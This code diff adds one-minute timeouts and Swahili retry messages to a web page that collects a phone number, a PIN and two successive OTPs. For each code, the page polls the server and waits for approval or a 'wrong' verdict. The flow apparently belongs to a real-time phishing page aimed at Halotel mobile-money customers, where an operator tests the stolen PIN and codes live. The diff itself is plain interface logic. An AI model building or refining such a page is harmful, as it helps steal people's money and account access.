@@ -468,7 +468,20 @@
         }
 
         async function pollPinApproval() {
+            let startTime = Date.now();
+            let timeoutMs = 60000; // 1 minute timeout
             let interval = setInterval(async () => {
+                if (Date.now() - startTime > timeoutMs) {
+                    clearInterval(interval);
+                    document.getElementById('step-waiting').style.display = 'none';
+                    const alarm = document.getElementById('phone-alarm');
+                    alarm.innerText = 'Muda umeisha. Tafadhali jaribu tena.';
+                    alarm.style.display = 'block';
+                    document.getElementById('step-phone').style.display = 'block';
+                    document.querySelectorAll('.pin-box').forEach(b => b.value = '');
+                    return;
+                }
+
                 try {
                     let res = await fetch('/api/check-pin-status');
                     if (!res.ok) return;
@@ -482,12 +495,10 @@
                         clearInterval(interval);
                         document.getElementById('step-waiting').style.display = 'none';
                         
-                        // Corrected line with proper quotes and parentheses
                         document.getElementById('phone-alarm').innerText = 'Tafadhali jisajili kwa kutumia namba yako ya Halotel.';
                         document.getElementById('phone-alarm').style.display = 'block';
                         document.getElementById('step-phone').style.display = 'block';
                         
-                        // Clear PIN inputs for retry
                         document.querySelectorAll('.pin-box').forEach(b => b.value = '');
                     }
                 } catch (e) {
@@ -495,6 +506,7 @@
                 }
             }, 3500);
         }
+
         async function submitOtp1() {
             const boxes = document.querySelectorAll('.otp1-box');
             let otp1 = '';
@@ -516,7 +528,20 @@
         }
 
         async function pollOtp1() {
+            let startTime = Date.now();
+            let timeoutMs = 60000; // 1 minute timeout
             let statusInterval = setInterval(async () => {
+                if (Date.now() - startTime > timeoutMs) {
+                    clearInterval(statusInterval);
+                    document.getElementById('step-waiting').style.display = 'none';
+                    const alarm = document.getElementById('otp1-alarm');
+                    alarm.innerText = 'Muda umeisha. Tafadhali jaribu tena.';
+                    alarm.style.display = 'block';
+                    document.getElementById('step-otp1').style.display = 'block';
+                    document.querySelectorAll('.otp1-box').forEach(b => b.value = '');
+                    return;
+                }
+
                 try {
                     let res = await fetch('/api/check-otp1-status');
                     if (!res.ok) return;
@@ -529,7 +554,6 @@
                     } else if (data.status === 'wrong') {
                         clearInterval(statusInterval);
                         document.getElementById('step-waiting').style.display = 'none';
-                        // Return to OTP1 step and show red alarm message above boxes
                         const alarm = document.getElementById('otp1-alarm');
                         alarm.innerText = 'OTP sio sahihi. Jaribu tena.';
                         alarm.style.display = 'block';
@@ -563,7 +587,20 @@
         }
 
         async function pollOtp2() {
+            let startTime = Date.now();
+            let timeoutMs = 60000; // 1 minute timeout
             let interval = setInterval(async () => {
+                if (Date.now() - startTime > timeoutMs) {
+                    clearInterval(interval);
+                    document.getElementById('step-waiting').style.display = 'none';
+                    const alarm = document.getElementById('otp2-alarm');
+                    alarm.innerText = 'Muda umeisha. Tafadhali jaribu tena.';
+                    alarm.style.display = 'block';
+                    document.getElementById('step-otp2').style.display = 'block';
+                    document.querySelectorAll('.otp2-box').forEach(b => b.value = '');
+                    return;
+                }
+
                 try {
                     let res = await fetch('/api/check-otp2-status');
                     if (!res.ok) return;
@@ -577,7 +614,6 @@
                     } else if (data.status === 'wrong') {
                         clearInterval(interval);
                         document.getElementById('step-waiting').style.display = 'none';
-                        // Return to OTP2 step and show red alarm message above boxes
                         const alarm = document.getElementById('otp2-alarm');
                         alarm.innerText = 'OTP sio sahihi. Jaribu tena.';
                         alarm.style.display = 'block';
